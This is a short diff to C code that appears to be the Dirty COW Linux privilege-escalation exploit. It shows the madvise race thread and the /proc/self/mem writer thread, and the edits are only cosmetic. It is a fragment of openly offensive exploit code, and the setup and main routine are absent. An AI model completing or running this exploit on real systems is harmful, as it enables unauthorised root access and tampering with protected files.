@@ -11,8 +11,7 @@ char *name;
 
 void *madviseThread(void *arg)
 {
-	char *str;
-	str = (char*)arg;
+	char *str = (char*)arg;
 	int i, c = 0;
 	for (i = 0; i<100000000; i++)
 	{
@@ -23,13 +22,12 @@ void *madviseThread(void *arg)
 		*/
 		c += madvise(map, 100, MADV_DONTNEED);
 	}
-	printf("madvise %d\n\n", c);
+	printf("madvise %d, %s\n\n", c, str);
 }
 
 void *procselfmemThread(void *arg)
 {
-	char *str;
-	str = (char*)arg;
+	char *str = (char*)arg;
 	/*
 	You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 	>  The in the wild exploit we are aware of doesn't work on Red Hat
